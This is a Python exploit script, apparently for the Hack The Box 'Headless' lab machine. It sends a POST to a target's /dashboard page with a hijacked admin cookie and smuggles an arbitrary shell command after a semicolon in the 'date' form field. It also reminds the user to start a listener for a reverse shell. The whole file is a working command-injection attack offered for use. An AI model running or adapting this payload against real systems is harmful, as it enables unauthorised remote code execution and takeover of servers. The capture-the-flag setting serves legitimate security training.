from argparse import ArgumentParser
import requests
import time

parser = ArgumentParser('HTB Headless Script')

parser.add_argument('-ip', '--ip', type=str, required=True, help='Target IP')
parser.add_argument('-p', '--port', type=str, required=True, help='Target port')
parser.add_argument('-a', '--cookie', type=str, required=True, help='Admin Cookie')
parser.add_argument('-c', '--command', type=str, required=True, help='Host IP')

args = parser.parse_args()


headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + args.ip + ':' + args.port,
    'Referer': 'http://' + args.ip + ':' + args.port + '/dashboard',
    'Cookie': 'is_admin=' + args.cookie,
    'Upgrade-Insecure-Requests': '1'
}

data = {'date': '2023-09-15;' + args.command}

print('[*] ENSURE YOU HAVE A LISTENER ACTIVE IF YOU ARE ISSUING COMMANDS FOR REVERSE SHELL [*]\n')
print('[+] Initialized script')
print('[+] Sending payload')
time.sleep(1)
response = requests.post("http://" + args.ip + ':' + args.port + '/dashboard', headers=headers, data=data)
print('[+] Payload sent')
